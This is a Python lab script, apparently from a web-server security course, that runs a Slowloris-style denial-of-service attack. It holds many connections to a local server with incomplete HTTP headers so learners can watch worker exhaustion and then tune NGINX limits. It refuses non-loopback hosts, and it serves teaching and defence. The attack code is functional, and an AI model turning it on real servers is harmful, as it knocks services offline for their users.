#!/usr/bin/env python3
"""
LAB-ONLY Slowloris-style connection holder.

Opens many sockets to YOUR local server and drip-feeds incomplete HTTP headers
so you can observe worker exhaustion — then apply NGINX timeouts / limits.

  # terminal 1 — victim (use beginner raw server or python http.server)
  node ../../01-beginner/src/raw-http-server.js

  # terminal 2
  python3 slowloris-lab.py --host 127.0.0.1 --port 8080 --sockets 50

NEVER point this at systems you do not own / lack permission to test.
"""

from __future__ import annotations

import argparse
import socket
import time


def main() -> None:
    p = argparse.ArgumentParser(description="LAB-ONLY Slowloris demo")
    p.add_argument("--host", default="127.0.0.1")
    p.add_argument("--port", type=int, default=8080)
    p.add_argument("--sockets", type=int, default=50)
    p.add_argument("--interval", type=float, default=10.0, help="seconds between header drips")
    args = p.parse_args()

    if args.host not in {"127.0.0.1", "localhost", "::1"}:
        raise SystemExit(
            "Refusing to run against non-loopback host. This script is lab-only."
        )

    sockets: list[socket.socket] = []
    print(f"Opening {args.sockets} sockets to {args.host}:{args.port} ...")
    for i in range(args.sockets):
        try:
            s = socket.create_connection((args.host, args.port), timeout=5)
            s.sendall(b"GET / HTTP/1.1\r\n")
            s.sendall(f"Host: {args.host}\r\n".encode())
            s.sendall(b"User-Agent: slowloris-lab\r\n")
            sockets.append(s)
        except OSError as e:
            print(f"  socket {i} failed: {e}")

    print(f"Holding {len(sockets)} connections. Ctrl+C to stop.")
    n = 0
    try:
        while True:
            time.sleep(args.interval)
            n += 1
            dead = []
            for s in sockets:
                try:
                    # Incomplete headers — never send final \r\n\r\n
                    s.sendall(f"X-Pad-{n}: {n}\r\n".encode())
                except OSError:
                    dead.append(s)
            for s in dead:
                sockets.remove(s)
                try:
                    s.close()
                except OSError:
                    pass
            print(f"drip #{n}, alive={len(sockets)}")
    except KeyboardInterrupt:
        print("\nClosing...")
    finally:
        for s in sockets:
            try:
                s.close()
            except OSError:
                pass


if __name__ == "__main__":
    main()
